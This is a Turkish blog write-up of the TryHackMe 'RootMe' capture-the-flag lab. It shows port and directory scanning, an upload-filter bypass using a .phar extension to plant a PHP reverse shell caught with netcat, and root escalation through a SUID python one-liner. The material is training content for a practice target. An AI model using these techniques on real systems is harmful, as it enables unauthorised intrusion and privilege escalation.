---
title: 'TryHackMe | RootMe WriteUp'
author: 'appdone'
categories: [TryHackMe]
render_with_liquid: false
media_subpath: /images/tryhackme_rootme/
image:
  path: logo.webp
---

Merhaba, bu yazıda TryHackMe platformunda yer alan "RootMe" isimli meydan okumayı çözeceğiz. Öncelikle hedefi tanımak adına nmap ile bir port taraması yapalım. Daha sonra açık portlara ve üzerinde çalışan servislere göre yolumuzu çizmeye başlayabiliriz.

```console
$ nmap -sSVC --min-rate 1000 10.10.53.233
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 11:24 EDT
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tarama sonucunda 22 (SSH) ve 80 (HTTP) numaralı portların açık olduğunu öğreniyoruz. Servislerin sürümlerinden yola çıkarak hiçbir şey yapamayacağımızdan doğrudan web uygulamasına yöneleceğiz.

Web sitesinin ana sayfasında önemli bir bilgi bulunmuyor. Daha fazla dosya ve dizin bulmak için Dirsearch aracını kullanacağım.

```console
$ dirsearch -u http://10.10.53.233
...
[11:26:55] 301 -  310B  - /css  ->  http://10.10.53.233/css/
[11:27:08] 200 -  464B  - /js/
[11:27:18] 200 -  388B  - /panel/
[11:27:37] 200 -  405B  - /uploads/
...
```

Tarama sonucunda panel ve uploads olmak üzere iki dizin keşfediyoruz. Panel dizininde bir login sayfası bulunuyor. Uploads dizininde ise adından da anlaşılacağı üzere yüklenen dosyalar bulunuyor.

![file upload](1.webp){: width="1200" height="600" }

Panel dizinindeki form'a php ile yazılmış olan reverse shell dosyasını yüklemeye çalıştığımda php dosyalarının yasaklı olduğunu öğreniyorum. Dosya adını sürekli değiştirerek sayfayı yüklemeye çalıştığımda .phar dosyalarının sorunsuzca yüklendiğini anladım.

![file upload](2.webp){: width="1200" height="600" }

Dosyayı yükledikten sonra uploads dizininde olup olmadığını kontrol ettim. Daha sonra 1234 numaralı portu netcat ile dinlemeye aldım ve dosyayı çalıştırdım.

```console
$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.21.66.61] from (UNKNOWN) [10.10.53.233] 46542
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:36:02 up 13 min,  0 users,  load average: 0.01, 0.07, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Bağlantıyı aldıktan sonra user.txt dosyasını bulmak için dizinleri gezmeye başladım ve /var/www dosyasında olduğunu gördüm.

```console
www-data@rootme:/var/www$ cat user.txt
THM{***}
www-data@rootme:/var/www$
```

Son olarak yetki yükselterek son bayrağı almamız gerekiyor. SUID bitine sahip dosyaları listeledikten sonra python dosyasını sahibi olan root kullanıcısı adına çalıştırabileceğimi gördüm.

```console
www-data@rootme:/var/www$ find / -perm -4000 2>/dev/null
...
/usr/bin/python
...
```

Bundan sonra yapmamız gereken tek şey "-c" parametresi ile os modülünü kullanarak bash'e geçmektir. Root haklarında çalışacağı için yetki yükseltmiş olacağız.

```console
www-data@rootme:/var/www$ python -c "import os;os.system('bash')"
www-data@rootme:/var/www$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
root.txt
# cat root.txt
THM{***}
```

Yetki yükselttikten sonra /root dizininden son bayrağı aldım. Bu arada resimde gördüğünüz ilk komutu girdikten sonra yetki yükseltemedim. Tekrar denemek için yukarı ok işaretini kullanarak aynı komutu seçtiğimde kendisi otomatik olarak komutu düzenledi. Böyle bir şey ile ilk defa karşılaşıyorum. Neden olduğu konusunda bir fikrim yok.
